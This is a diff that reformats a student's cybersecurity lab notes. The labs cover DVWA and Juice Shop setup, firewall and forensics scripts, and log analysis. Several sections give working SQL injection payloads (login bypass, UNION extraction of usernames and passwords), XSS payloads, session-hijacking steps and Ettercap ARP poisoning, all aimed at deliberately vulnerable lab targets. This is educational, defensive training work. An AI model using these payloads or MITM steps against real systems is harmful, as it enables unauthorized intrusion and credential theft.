@@ -1,11 +1,24 @@
-DVWA: docker run -it -p 8080:80 vulnerables/web-dvwa
-JS:docker run -d -p 8090:3000 --name juiceshop bkimminich/juice-shop
+# Cybersecurity Lab Notes
 
+---
 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-FIREWALL
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-firewall.py
+## DVWA & Juice Shop Setup
+
+```bash
+# DVWA
+docker run -it -p 8080:80 vulnerables/web-dvwa
+
+# Juice Shop
+docker run -d -p 8090:3000 --name juiceshop bkimminich/juice-shop
+```
+
+---
+
+## Firewall — Block Malicious IPs (Feodo Tracker)
+
+**`firewall.py`**
+
+```python
 import requests
 import csv
 import subprocess
@@ -18,135 +31,114 @@ response = requests.get(url)
 
 # Delete old firewall rules named "BadIP"
 subprocess.run(
-[
-"powershell",
-"-Command",
-"netsh advfirewall firewall delete rule name='BadIP'"
-]
+    ["powershell", "-Command", "netsh advfirewall firewall delete rule name='BadIP'"]
 )
 
 # Read CSV while ignoring comment lines starting with '#'
 mycsv = csv.reader(
-filter(
-lambda x: not x.startswith("#"),
-response.text.splitlines()
-)
+    filter(lambda x: not x.startswith("#"), response.text.splitlines())
 )
 
 # Process each row
 for row in mycsv:
+    # Extract destination IP column
+    ip = row[1].strip()
 
-# Extract destination IP column
-ip = row[1].strip()
+    # Skip header row
+    if ip != "dst_ip":
+        # Outbound block rule
+        rule_out = (
+            f"netsh advfirewall firewall add rule "
+            f"name='BadIP' "
+            f"dir=out "
+            f"action=block "
+            f"remoteip={ip}"
+        )
 
-# Skip header row
-if ip != "dst_ip":
+        # Inbound block rule
+        rule_in = (
+            f"netsh advfirewall firewall add rule "
+            f"name='BadIP' "
+            f"dir=in "
+            f"action=block "
+            f"remoteip={ip}"
+        )
 
-# Outbound block rule
-rule_out = (
-f"netsh advfirewall firewall add rule "
-f"name='BadIP' "
-f"dir=out "
-f"action=block "
-f"remoteip={ip}"
-)
+        # Execute firewall rules
+        subprocess.run(["powershell", "-Command", rule_out])
+        subprocess.run(["powershell", "-Command", rule_in])
 
-# Inbound block rule
-rule_in = (
-f"netsh advfirewall firewall add rule "
-f"name='BadIP' "
-f"dir=in "
-f"action=block "
-f"remoteip={ip}"
-)
-
-# Execute firewall rules
-subprocess.run(["powershell", "-Command", rule_out])
-subprocess.run(["powershell", "-Command", rule_in])
-
-print(f"[+] Blocked IP: {ip}")
+        print(f"[+] Blocked IP: {ip}")
 
 print("\nAll malicious IPs have been blocked.")
+```
 
-Install Required Package
+**Install Required Package**
+
+```bash
 pip install requests
+```
 
-Run the Script
-Run Command Prompt or PowerShell as Administrator:
+**Run the Script** — Run Command Prompt or PowerShell as Administrator:
 
+```bash
 python firewall.py
+```
 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-PASSWORD STRENGTH CHECK
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+---
+
+## Password Strength Check
+
+```java
 import java.util.Scanner;
 
 public class PasswordStrengthChecker {
 
-public static String checkPasswordStrength(String password) {
+    public static String checkPasswordStrength(String password) {
+        int strength = 0;
 
-int strength = 0;
+        // Length check
+        if (password.length() >= 8) { strength++; }
 
-// Length check
-if (password.length() >= 8) {
-strength++;
-}
+        // Uppercase check
+        if (password.matches(".*[A-Z].*")) { strength++; }
 
-// Uppercase check
-if (password.matches(".*[A-Z].*")) {
-strength++;
-}
+        // Lowercase check
+        if (password.matches(".*[a-z].*")) { strength++; }
 
-// Lowercase check
-if (password.matches(".*[a-z].*")) {
-strength++;
-}
+        // Number check
+        if (password.matches(".*[0-9].*")) { strength++; }
 
-// Number check
-if (password.matches(".*[0-9].*")) {
-strength++;
-}
+        // Special character check
+        if (password.matches(".*[!@#$%^&*(),.?\":{}|<>].*")) { strength++; }
 
-// Special character check
-if (password.matches(".*[!@#$%^&*(),.?\":{}|<>].*")) {
-strength++;
-}
+        // Strength evaluation
+        if (strength == 5) { return "Very Strong Password"; }
+        else if (strength == 4) { return "Strong Password"; }
+        else if (strength == 3) { return "Medium Password"; }
+        else if (strength == 2) { return "Weak Password"; }
+        else { return "Very Weak Password"; }
+    }
 
-// Strength evaluation
-if (strength == 5) {
-return "Very Strong Password";
-}
-else if (strength == 4) {
-return "Strong Password";
-}
-else if (strength == 3) {
-return "Medium Password";
-}
-else if (strength == 2) {
-return "Weak Password";
-}
-else {
-return "Very Weak Password";
-}
-}
+    public static void main(String[] args) {
+        Scanner sc = new Scanner(System.in);
 
-public static void main(String[] args) {
+        System.out.print("Enter Password: ");
+        String password = sc.nextLine();
 
-Scanner sc = new Scanner(System.in);
+        String result = checkPasswordStrength(password);
+        System.out.println("Password Strength: " + result);
 
-System.out.print("Enter Password: ");
-String password = sc.nextLine();
-
-String result = checkPasswordStrength(password);
-
-System.out.println("Password Strength: " + result);
-
-sc.close();
+        sc.close();
+    }
 }
-}
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-PACKET SNIFFING AND NETWORK TRAFFIC ANALYSIS
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+```
+
+---
+
+## Packet Sniffing and Network Traffic Analysis
+
+```bash
 # Open terminal and start HTTP server
 python3 -m http.server 8080
 
@@ -156,7 +148,7 @@ sudo tcpdump -i any -w capture.pcap port 8080
 # Open browser and access
 http://localhost:8080
 
-# Stop capturing using
+# Stop capturing
 Ctrl + C
 
 # Open capture file in Wireshark
@@ -164,10 +156,13 @@ wireshark capture.pcap
 
 # Apply filter in Wireshark
 http.request.method == "GET"
+```
 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-SQL Injection Attack
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+---
+
+## SQL Injection Attack
+
+```bash
 # Install DVWA
 sudo apt update
 sudo apt install dvwa -y
@@ -178,40 +173,43 @@ sudo service mysql start
 
 # Open DVWA
 http://127.0.0.1/dvwa
+```
 
-# Normal Input
+**Payloads:**
+
+```sql
+-- Normal Input
 1
 
-# Authentication Bypass
+-- Authentication Bypass
 1' OR '1'='1
 
-# Find Columns
+-- Find Columns
 1' ORDER BY 1-- -
 1' ORDER BY 2-- -
 1' ORDER BY 3-- -
 
-# UNION Injection
+-- UNION Injection
 1' UNION SELECT 1,2-- -
 
-# Database Name
+-- Database Name
 1' UNION SELECT database(),2-- -
 
-# Table Names
-1' UNION SELECT table_name,2
-FROM information_schema.tables
-WHERE table_schema=database()-- -
+-- Table Names
+1' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database()-- -
 
-# Column Names
-1' UNION SELECT column_name,2
-FROM information_schema.columns
-WHERE table_name='users'-- -
+-- Column Names
+1' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users'-- -
 
-# Extract Usernames and Passwords
+-- Extract Usernames and Passwords
 1' UNION SELECT user,password FROM users-- -
+```
 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-Finding & Exploiting XSS Vulnerabilities using DVWA on Kali Linux
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+---
+
+## Finding & Exploiting XSS Vulnerabilities using DVWA on Kali Linux
+
+```bash
 # Start Apache
 sudo service apache2 start
 
@@ -219,75 +217,64 @@ sudo service apache2 start
 sudo service mysql start
 
 http://localhost/dvwa
+```
 
-<!-- Reflected XSS -->
+**Payloads:**
+
+```html
+<!-- Basic XSS -->
 <script>alert('XSS')</script>
 
-<!-- Stored XSS -->
-<h1>Hacked</h1>
-
+<!-- Hacked -->
 <script>alert('Stored XSS')</script>
 
 <!-- DOM XSS -->
-#<script>alert('DOM XSS')</script>
+<script>alert('DOM XSS')</script>
 
-<!-- Cookie Demo -->
+<!-- Cookie Theft -->
 <script>alert(document.cookie)</script>
+```
 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-Testing Authentication Weaknesses and Session Management Using Kali Linux & DVWA
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-#Step 1:
-Start services.
+---
 
+## Testing Authentication Weaknesses and Session Management Using Kali Linux & DVWA
+
+```bash
+# Step 1: Start services
 sudo service apache2 start
 sudo service mysql start
 
-#Step 2:
-Open:
+# Step 2: Open DVWA
 http://127.0.0.1/dvwa
+# Login — Username: admin | Password: password
 
-Login:
-Username: admin
-Password: password
+# Step 3: Set DVWA Security Level = LOW
 
-#Step 3:
-Set DVWA Security Level = LOW.
+# Step 4: Open DVWA → Vulnerabilities → Brute Force
+# Try:
+#   admin / admin
+#   admin / 123456
+#   admin / password
 
-#Step 4:
-Open:
-DVWA → Vulnerabilities → Brute Force
+# Step 5: Check Cookies
+# Inspect → Storage → Cookies
 
-Try:
-admin / admin
-admin / 123456
-admin / password
+# Step 6: Copy PHPSESSID
+# Open Private Window (Ctrl + Shift + P) → Paste same PHPSESSID → Refresh page
 
-#Step 5:
-Check Cookies:
-Inspect → Storage → Cookies
+# Step 7: Check PHPSESSID before and after login
 
-#Step 6:
-Copy PHPSESSID.
-Open Private Window (Ctrl + Shift + P).
-Paste same PHPSESSID and refresh page.
+# Step 8: Logout from DVWA → Reuse old PHPSESSID in Private Window
+```
 
-#Step 7:
-Check PHPSESSID before and after login.
+---
 
-#Step 8:
-Logout from DVWA.
-Reuse old PHPSESSID in Private Window.
+## Ettercap — ARP Poisoning / MITM
 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-Ettercap
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
+```bash
 # Check IP Address
 ifconfig
-
-IP Address:
-192.168.0.103
+# IP Address: 192.168.0.103
 
 # Open Ettercap
 ettercap -G
@@ -316,429 +303,441 @@ Click OK
 
 # Observation
 ARP poisoning attack starts between victims.
+```
 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-TESTING IoT DEVICE SECURITY (DEFAULT PASSWORDS & OPEN PORTS)
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+---
 
-A. DEPLOY VULNERABLE IoT SIMULATION (DOCKER)
+## Testing IoT Device Security (Default Passwords & Open Ports)
 
+**A. Deploy Vulnerable IoT Simulation (Docker)**
+
+```bash
 docker run -d -p 8090:3000 --name juiceshop bkimminich/juice-shop
 docker ps
 docker logs juiceshop
+```
 
+**B. Access Application (Verify Deployment)**
 
-B. ACCESS APPLICATION (VERIFY DEPLOYMENT)
-
+```
 http://localhost:8090
+```
 
+**C. Identify Host IP Address**
 
-C. IDENTIFY HOST IP ADDRESS
-
-Windows:
+```bash
+# Windows
 ipconfig
 
-Linux/macOS:
+# Linux/macOS
 ifconfig
+```
 
+**D. Network Scanning from Kali Linux**
 
-D. NETWORK SCANNING FROM KALI LINUX
-
+```bash
 nmap 10.39.169.126
 nmap -sV 10.39.169.126
 nmap -A 10.39.169.126
+```
 
+**E. Port + Service Enumeration**
 
-E. PORT + SERVICE ENUMERATION
-
+```bash
 nmap -p- 10.39.169.126
 nmap -sC -sV 10.39.169.126
 nmap --open 10.39.169.126
+```
 
+**F. Access IoT Dashboard from Attacker Machine**
 
-F. ACCESS IoT DASHBOARD FROM ATTACKER MACHINE
-
+```
 http://10.39.169.126:8090
+```
 
+**G. Test Default / Weak Credentials**
 
-G. TEST DEFAULT / WEAK CREDENTIALS
-
+```
 admin / admin
 admin / password
 user / user
+```
 
+**H. Analyze Network Traffic**
 
-H. ANALYZE NETWORK TRAFFIC
+```
+Open Browser → Press F12 → Go to Network Tab → Reload page → Inspect HTTP requests
+```
 
-Open Browser
-Press F12
-Go to Network Tab
-Reload page
-Inspect HTTP requests
+---
 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-ANALYSING ANDROID APP PERMISSIONS AND MOBILE TRAFFIC
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+## Analysing Android App Permissions and Mobile Traffic
 
-A.VERIFY
-1.C:\Users\Admin>cd C:\Users\Admin\AppData\Local\Android\Sdk\emulator
-2.C:\Users\Admin\AppData\Local\Android\Sdk\emulator>emulator -list-avds
+**A. Verify**
 
-B.SETUP PROXY
-1.cd C:\Users\Admin\AppData\Local\Android\Sdk\platform-tools
-2.adb devices
-3.adb shell settings put global http_proxy 10.0.2.2:8080
-4.adb shell settings get global http_proxy
+```bash
+cd C:\Users\Admin\AppData\Local\Android\Sdk\emulator
+emulator -list-avds
+```
 
-C.SEND CERTIFICATE TO EMULATOR
-1.C:\Users\Admin\AppData\Local\Android\Sdk\platform-tools>adb push C:\Users\Admin\Downloads\burpcer.der /sdcard/Download/
+**B. Setup Proxy**
 
+```bash
+cd C:\Users\Admin\AppData\Local\Android\Sdk\platform-tools
+adb devices
+adb shell settings put global http_proxy 10.0.2.2:8080
+adb shell settings get global http_proxy
+```
 
-E. INSTALL CERTIFICATE IN EMULATOR
+**C. Send Certificate to Emulator**
 
+```bash
+adb push C:\Users\Admin\Downloads\burpcer.der /sdcard/Download/
+```
+
+**E. Install Certificate in Emulator**
+
+```
 Settings → Security → Install Certificate → Select burpcer.der
+```
 
+**F. Analyze App Traffic**
 
-F. ANALYZE APP TRAFFIC
+```
+Open Android application → Observe requests in Burp Suite
+```
 
-Open Android application
-Observe requests in Burp Suite
+**G. Check App Permissions**
 
-
-G. CHECK APP PERMISSIONS
-
+```
 Settings → Apps → App Permissions
+```
 
+---
 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-WEB APPLICATION VULNERABILITY SCANNING WITH OWASP ZAP
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+## Web Application Vulnerability Scanning with OWASP ZAP
 
-STEP 1 — Install OWASP ZAP
-Download and install OWASP ZAP from:
-https://www.zaproxy.org/download/
+**Step 1 — Install OWASP ZAP**
 
-STEP 2 — Run OWASP Juice Shop
-Open Command Prompt:
+Download and install from: https://www.zaproxy.org/download/
 
+**Step 2 — Run OWASP Juice Shop**
+
+```bash
 docker run -d -p 3000:3000 bkimminich/juice-shop
+```
 
-STEP 3 — Open Juice Shop
-Open browser:
+**Step 3 — Open Juice Shop**
 
+```
 http://localhost:3000
+```
 
-STEP 4 — Start OWASP ZAP
+**Step 4 — Start OWASP ZAP**
+
 1. Open OWASP ZAP
-2. Select:
-No, I do not want to persist this session
+2. Select: `No, I do not want to persist this session`
 3. Click Start
 
-STEP 5 — Configure Proxy
-Set browser proxy:
+**Step 5 — Configure Proxy**
 
+```
 HTTP Proxy : 127.0.0.1
-Port : 8080
+Port       : 8080
+```
 
-STEP 6 — Perform Spider Scan
-1. Right-click:
-http://localhost:3000
-2. Select:
-Attack → Spider
+**Step 6 — Perform Spider Scan**
+
+1. Right-click: `http://localhost:3000`
+2. Select: `Attack → Spider`
 3. Start Scan
 
-STEP 7 — Perform Active Scan
-1. Right-click:
-http://localhost:3000
-2. Select:
-Attack → Active Scan
+**Step 7 — Perform Active Scan**
+
+1. Right-click: `http://localhost:3000`
+2. Select: `Attack → Active Scan`
 3. Start Scan
 
-STEP 8 — Analyze Alerts
+**Step 8 — Analyze Alerts**
+
 Open Alerts tab to view vulnerabilities like:
-• XSS
-• Missing Security Headers
-• Cookie Issues
+- XSS
+- Missing Security Headers
+- Cookie Issues
 
-STEP 9 — Generate Report
-Go to:
-Report → Generate Report
-Save report in HTML/PDF format.
+**Step 9 — Generate Report**
 
+```
+Report → Generate Report → Save in HTML/PDF format
+```
 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-CREATING AND ANALYZING DISK IMAGES USING dc3dd AND AUTOPSY
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-A. OPEN TERMINAL
-1.Ctrl + Alt + T
+---
 
-B. CREATE SAMPLE EVIDENCE
-1.echo "Cybersecurity Lab Evidence" > evidence.txt
-2.ls
+## Creating and Analyzing Disk Images Using dc3dd and Autopsy
 
-C. IDENTIFY DISK PARTITION
-1.lsblk
+```bash
+# A. Open Terminal
+Ctrl + Alt + T
 
-D. CREATE PRACTICE DISK IMAGE
-1.dd if=/dev/zero of=practice_disk.dd bs=1M count=100
+# B. Create Sample Evidence
+echo "Cybersecurity Lab Evidence" > evidence.txt
+ls
 
-E. FORMAT / MOUNT DISK
-1.mkfs.ext4 practice_disk.dd
+# C. Identify Disk Partition
+lsblk
 
-F. CREATE FORENSIC IMAGE USING dc3dd
-1.sudo dc3dd if=practice_disk.dd of=forensic_image.dd hash=md5 log=acquisition.log
+# D. Create Practice Disk Image
+dd if=/dev/zero of=practice_disk.dd bs=1M count=100
 
-G. VERIFY IMAGE AND LOG
-1.ls -lh practice_disk.dd
-2.cat acquisition.log
+# E. Format / Mount Disk
+mkfs.ext4 practice_disk.dd
 
-H. START AUTOPSY TOOL
-1.autopsy
+# F. Create Forensic Image Using dc3dd
+sudo dc3dd if=practice_disk.dd of=forensic_image.dd hash=md5 log=acquisition.log
 
-I. ACCESS AUTOPSY IN BROWSER
-1.http://localhost:9999/autopsy
+# G. Verify Image and Log
+ls -lh practice_disk.dd
+cat acquisition.log
 
-J. (INSIDE AUTOPSY - GUI STEPS, NOT COMMANDS)
-1.Create New Case
-2.Add Host
-3.Add Image → Select:
-4./home/kali/forensic_image.dd
+# H. Start Autopsy Tool
+autopsy
 
-K. OPTIONAL (USEFUL ADDITIONAL COMMANDS FOR ANALYSIS)
-1.pwd
-2.whoami
-3.df -h
-4.file forensic_image.dd
-5.md5sum forensic_image.dd
+# I. Access Autopsy in Browser
+http://localhost:9999/autopsy
+```
 
+**J. Inside Autopsy (GUI Steps)**
 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-Cross-Site Scripting (XSS) using Juice Shop and Burp Suite
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-STEP 1 — Run OWASP Juice Shop
+1. Create New Case
+2. Add Host
+3. Add Image → Select: `/home/kali/forensic_image.dd`
 
-Pull Docker Image:
+**K. Optional — Useful Additional Commands**
+
+```bash
+pwd
+whoami
+df -h
+file forensic_image.dd
+md5sum forensic_image.dd
+```
+
+---
+
+## Cross-Site Scripting (XSS) using Juice Shop and Burp Suite
+
+**Step 1 — Run OWASP Juice Shop**
+
+```bash
 docker pull bkimminich/juice-shop
-
-Run Container:
 docker run -d -p 3000:3000 bkimminich/juice-shop
+```
 
-Open:
+```
 http://localhost:3000
+```
 
-STEP 2 — Configure Burp Suite Proxy
+**Step 2 — Configure Burp Suite Proxy**
 
 1. Open Burp Suite
-2. Go to:
-Proxy → Options
-3. Set Proxy Listener:
-127.0.0.1 : 8081
+2. Go to: `Proxy → Options`
+3. Set Proxy Listener: `127.0.0.1 : 8081`
 
-Configure browser proxy:
+```
 HTTP Proxy : 127.0.0.1
-Port : 8081
+Port       : 8081
+```
 
-STEP 3 — Identify XSS Vulnerability
+**Step 3 — Identify XSS Vulnerability**
 
 1. Open Juice Shop
-2. Find input fields like:
-• Search bar
-• Login form
-• Feedback form
-
-3. In Burp Suite:
-Proxy → HTTP History
-
+2. Find input fields like: Search bar, Login form, Feedback form
+3. In Burp Suite: `Proxy → HTTP History`
 4. Send request to Repeater
-
 5. Test payload:
+
+```html
 <script>alert("XSS")</script>
+```
 
 6. Click Send and observe response.
 
-STEP 4 — Exploit XSS in Feedback Form
+**Step 4 — Exploit XSS in Feedback Form**
 
-1. Open Feedback/Contact Us page
+1. Open Feedback / Contact Us page
 2. Enter payload:
+
+```html
 <script>alert("XSS")</script>
+```
 
-3. Submit form
+3. Submit form → Alert popup confirms XSS vulnerability.
 
-4. Alert popup confirms XSS vulnerability.
+**Step 5 — Perform Stored XSS**
 
-STEP 5 — Perform Stored XSS
-
-Payload:
+```html
 <script>document.write('<img src=x onerror=alert("Stored XSS")>')</script>
+```
 
 1. Enter payload in review/feedback field
 2. Submit form
 3. Reload page
 4. Stored alert popup appears
 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-Testing Authentication Weaknesses and Session Management using Dockerized OWASP Juice Shop on Kali Linux
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+---
 
-STEP 1 — Install Docker
+## Testing Authentication Weaknesses and Session Management using Dockerized OWASP Juice Shop on Kali Linux
 
+**Step 1 — Install Docker**
+
+```bash
 sudo apt update
 sudo apt install docker.io -y
 sudo systemctl start docker
 sudo systemctl enable docker
 
-Check version:
+# Check version
 docker --version
+```
 
-STEP 2 — Run OWASP Juice Shop
+**Step 2 — Run OWASP Juice Shop**
 
+```bash
 sudo docker run -d -p 3000:3000 --name juice-shop bkimminich/juice-shop
 
-Check container:
+# Check container
 sudo docker ps
+```
 
-STEP 3 — Open Application
+**Step 3 — Open Application**
 
+```
 http://localhost:3000
+```
 
-STEP 4 — Configure Burp Suite
+**Step 4 — Configure Burp Suite**
 
 1. Open Burp Suite
-2. Proxy → Intercept ON
+2. `Proxy → Intercept ON`
 3. Configure browser proxy:
 
-IP : 127.0.0.1
+```
+IP   : 127.0.0.1
 Port : 8080
+```
 
-PART A — AUTHENTICATION TESTING
+### Part A — Authentication Testing
 
-Test 1: SQL Injection Login Bypass
+**Test 1: SQL Injection Login Bypass**
 
-Email:
-' OR 1=1 --
+```
+Email    : ' OR 1=1 --
+Password : anything
+Result   : Login bypass successful
+Inference: Application vulnerable to SQL Injection
+```
 
-Password:
-anything
+**Test 2: Weak Password Policy**
 
-Result:
-Login bypass successful
+```
+Password used : 12345
+Inference     : No strong password enforcement
+```
 
-Inference:
-Application vulnerable to SQL Injection
-
-Test 2: Weak Password Policy
-
-Password used:
-12345
-
-Inference:
-No strong password enforcement
-
-Test 3: Username Enumeration
+**Test 3: Username Enumeration**
 
 1. Try valid email + wrong password
 2. Try invalid email + wrong password
 
-Result:
-Different error messages displayed
+```
+Result   : Different error messages displayed
+Inference: Valid usernames can be identified
+```
 
-Inference:
-Valid usernames can be identified
+### Part B — Session Management Testing
 
-PART B — SESSION MANAGEMENT TESTING
-
-Test 4: Session Cookie Analysis
+**Test 4: Session Cookie Analysis**
 
 1. Login
-2. Open:
-F12 → Application → Cookies
+2. Open: `F12 → Application → Cookies`
 
-Result:
-Session token visible
+```
+Result   : Session token visible
+Inference: Check Secure and HTTPOnly flags
+```
 
-Inference:
-Check Secure and HTTPOnly flags
-
-Test 5: Session Hijacking
+**Test 5: Session Hijacking**
 
 1. Copy session cookie
 2. Open another browser
 3. Replace cookie
 
-Result:
-Access gained without login
+```
+Result   : Access gained without login
+Inference: Session hijacking possible
+```
 
-Inference:
-Session hijacking possible
-
-Test 6: Session Fixation
+**Test 6: Session Fixation**
 
 1. Note session ID before login
 2. Login
 3. Compare session ID
 
-Result:
-Same session ID remains
+```
+Result   : Same session ID remains
+Inference: Session fixation vulnerability exists
+```
 
-Inference:
-Session fixation vulnerability exists
-
-Test 7: Logout Mechanism
+**Test 7: Logout Mechanism**
 
 1. Login and copy cookie
 2. Logout
 3. Reuse cookie
 
-Result:
-Session still active
+```
+Result   : Session still active
+Inference: Session not invalidated properly
+```
 
-Inference:
-Session not invalidated properly
-
-Test 8: JWT Token Analysis
+**Test 8: JWT Token Analysis**
 
 1. Copy JWT token
-2. Decode using jwt.io
+2. Decode using https://jwt.io
 
-Result:
-Payload visible
+```
+Result   : Payload visible
+Inference: Improper token validation possible
+```
 
-Inference:
-Improper token validation possible
+**Docker Commands Used**
 
-DOCKER COMMANDS USED
-
+```bash
 docker ps
 docker stop juice-shop
 docker start juice-shop
 docker rm juice-shop
 docker logs juice-shop
+```
 
+---
 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-NETWORK FORENSICS USING WIRESHARK
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+## Network Forensics Using Wireshark
 
-A. START WIRESHARK
+```bash
+# A. Start Wireshark
 wireshark
 
-
-B. SELECT NETWORK INTERFACE
+# B. Select Network Interface
 eth0
 wlan0
 
-
-C. START CAPTURE
+# C. Start Capture
 Click Start
 
+# D. Generate Network Traffic
+# Open browser, visit websites, ping systems
 
-D. GENERATE NETWORK TRAFFIC
-Open browser
-Visit websites
-Ping systems
-
-
-E. APPLY FILTERS
+# E. Apply Filters
 http
 https
 dns
@@ -746,185 +745,189 @@ tcp
 udp
 ip.addr == 192.168.1.1
 
-
-F. STOP CAPTURE
+# F. Stop Capture
 Click Stop
 
+# G. Analyze Packets
+# Inspect: Source IP, Destination IP, Protocols, DNS Queries, HTTP Requests
+```
 
-G. ANALYZE PACKETS
+---
 
-Inspect:
-Source IP
-Destination IP
-Protocols
-DNS Queries
-HTTP Requests
+## Log File Analysis for Incident Detection Lab
 
-
-
-
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-LOG FILE ANALYSIS FOR INCIDENT DETECTION LAB
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-A. NAVIGATE TO LOG DIRECTORY
+```bash
+# A. Navigate to Log Directory
 cd /var/log
 ls
 
-B. VIEW SUCCESSFUL LOGIN RECORDS
+# B. View Successful Login Records
 last
 
-C. VIEW SYSTEM LOGS (FULL)
+# C. View System Logs (Full)
 journalctl
 journalctl | less
 
-D. FILTER FAILED LOGIN ATTEMPTS
+# D. Filter Failed Login Attempts
 journalctl | grep "Failed"
 journalctl | grep "Failed password"
 
-E. VIEW SSH LOGIN ACTIVITY
+# E. View SSH Login Activity
 journalctl | grep ssh
 
-F. FILTER SYSTEM ERRORS
+# F. Filter System Errors
 journalctl | grep -i error
 
-G. ANALYZE APACHE LOGS
+# G. Analyze Apache Logs
 cd /var/log/apache2
 ls
 sudo less access.log
 
-H. DETECT SUSPICIOUS WEB REQUESTS
+# H. Detect Suspicious Web Requests
 grep "404" /var/log/apache2/access.log
 
-I. VIEW PACKAGE ACTIVITY
+# I. View Package Activity
 less /var/log/dpkg.log
 
-J. REAL-TIME LOG MONITORING
+# J. Real-Time Log Monitoring
 sudo journalctl -f
+```
 
-K. SIMULATE FAILED SSH LOGIN ATTACK
-Install SSH Server
+**K. Simulate Failed SSH Login Attack**
+
+```bash
+# Install SSH Server
 sudo apt install openssh-server -y
 
-Start SSH Service
-2. sudo service ssh start
+# Start SSH Service
+sudo service ssh start
 
-Find IP Address
-3. ip a
+# Find IP Address
+ip a
 
-Generate Failed Logins
-4. ssh fakeuser@localhost
-5. ssh kali@localhost
+# Generate Failed Logins
+ssh fakeuser@localhost
+ssh kali@localhost
+```
 
-L. ANALYZE FAILED LOGIN ATTEMPTS
+```bash
+# L. Analyze Failed Login Attempts
 journalctl | grep "Failed password"
 
-M. EXTRACT SUSPICIOUS IP ADDRESS
+# M. Extract Suspicious IP Address
 journalctl | grep "Failed password" | awk '{print $11}'
 
-N. COUNT FAILED ATTEMPTS PER IP
+# N. Count Failed Attempts Per IP
 journalctl | grep "Failed password" | awk '{print $11}' | sort | uniq -c | sort -nr
 
-O. ALTERNATIVE METHOD (FAILED LOGINS)
+# O. Alternative Method (Failed Logins)
 sudo lastb
 
-P. CHECK RECENT LOG ACTIVITY
+# P. Check Recent Log Activity
 journalctl --since "10 minutes ago"
+```
 
+---
 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-7. PRIVACY AUDIT OF POPULAR APPS (DESKTOP WHATSAPP) AND WEBSITES (FACEBOOK) & DATA BREACH CASE STUDY ANALYSIS
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+## Privacy Audit of Popular Apps (Desktop WhatsApp) and Websites (Facebook) & Data Breach Case Study Analysis
 
-A. INSTALL NODE.js & npm
+**A. Install Node.js & npm**
 
+```bash
 sudo apt update
-
 sudo apt install nodejs npm -y
+```
 
+**B. Install Nativefier**
 
-B. INSTALL NATIVEFIER
-
+```bash
 sudo npm install -g nativefier
+```
 
+**C. Create WhatsApp Desktop App**
 
-C. CREATE WHATSAPP DESKTOP APP
-
+```bash
 nativefier https://web.whatsapp.com
-
 ls
+```
 
+**D. Run WhatsApp Desktop**
 
-D. RUN WHATSAPP DESKTOP
-
+```bash
 cd WhatsAppWeb-linux-x64
-
 ./WhatsAppWeb
+```
 
+**E. Login to WhatsApp**
 
-E. LOGIN TO WHATSAPP
+```
+Open mobile WhatsApp → Linked Devices → Scan QR code
+```
 
-Open mobile WhatsApp
-Linked Devices
-Scan QR code
+**F. Analyze Trackers (Exodus Privacy)**
 
-
-F. ANALYZE TRACKERS (EXODUS PRIVACY)
-
+```
 https://reports.exodus-privacy.eu.org
+```
 
+**G. Start Wireshark Capture**
 
-G. START WIRESHARK CAPTURE
-
+```bash
 wireshark
+```
 
+**H. Generate Network Traffic**
 
-H. GENERATE NETWORK TRAFFIC
+```
+Send messages, Send images, Open chats
+```
 
-Send messages
-Send images
-Open chats
+**I. Apply Wireshark Filters**
 
-
-I. APPLY WIRESHARK FILTERS
-
+```
 tls
-
 dns
+```
 
+**J. Stop Wireshark Capture**
 
-J. STOP WIRESHARK CAPTURE
-
+```
 Click Stop
+```
 
+**K. Open Facebook Website**
 
-K. OPEN FACEBOOK WEBSITE
-
+```
 https://www.facebook.com
+```
 
+**L. Start Burp Suite**
 
-L. START BURP SUITE
-
+```bash
 burpsuite
+```
 
+**M. Configure Proxy**
 
-M. CONFIGURE PROXY
+```
+IP   : 127.0.0.1
+Port : 8080
+```
 
-IP: 127.0.0.1
-Port: 8080
+**N. Enable Interception**
 
+```
+Turn Intercept ON → Reload Facebook page
+```
 
-N. ENABLE INTERCEPTION
+**O. Analyze Traffic**
 
-Turn Intercept ON
-Reload Facebook page
+```
+Press F12 → Open Network tab
+```
 
+**P. Check Email Data Breach**
 
-O. ANALYZE TRAFFIC
-
-Press F12
-Open Network tab
-
-
-P. CHECK EMAIL DATA BREACH
